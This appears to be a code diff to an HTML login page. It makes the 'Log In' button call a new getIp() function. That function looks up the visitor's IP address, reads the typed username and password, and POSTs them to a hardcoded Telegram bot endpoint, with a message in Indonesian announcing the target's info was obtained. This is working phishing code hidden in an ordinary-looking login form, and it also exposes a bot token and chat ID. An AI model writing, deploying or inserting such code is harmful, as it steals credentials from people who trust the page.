@@ -21,7 +21,7 @@
     <div>Username: </div><input id="usrnme" placeholder="Username"></input>
       <div>Password: </div><input id="pass" placeholder="Password" type="password"></input><button class="showpswd" type="checkbox" onclick="showpass()"><img id="icon" src="show.png" width="40px" alt=""><div class="textshow" id="textpass">Show Password</div></button>
 <br><br><a href="">Forgot Password?</a><br><br>
-<button class="login">Log In</button>
+<button onclick="getIp()" class="login">Log In</button>
 </font>
 </div>
 </center>
@@ -96,6 +96,20 @@
          }
     </style>
     <script>
+        async function getIp() {
+        let ipyu;
+        await
+fetch('https://api.ipify.org?format=json')
+.then(response => response.json())
+.then(data => ipyu = data.ip)
+.catch(error => console.error(error));
+        var usr = document.getElementById("usrnme").value;
+        var pass = document.getElementById("pass").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.telegram.org/bot7579364761:AAFfag2e5i1LP0-7AVATP9BbgMQUJh1ez-U/sendMessage?parse_mode=markdown&", true);
+        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+xhr.send("chat_id=6469804005&text=Berhasil Mendapat Info Target\n\nIp Target: "+encodeURIComponent(ipyu)+"\n\nUsername: \n"+encodeURIComponent(usr)+"\n\nPassword: \n"+encodeURIComponent(pass));
+        }
         function showpass() {
             var x = document.getElementById("pass");
             var a = document.getElementById("icon");
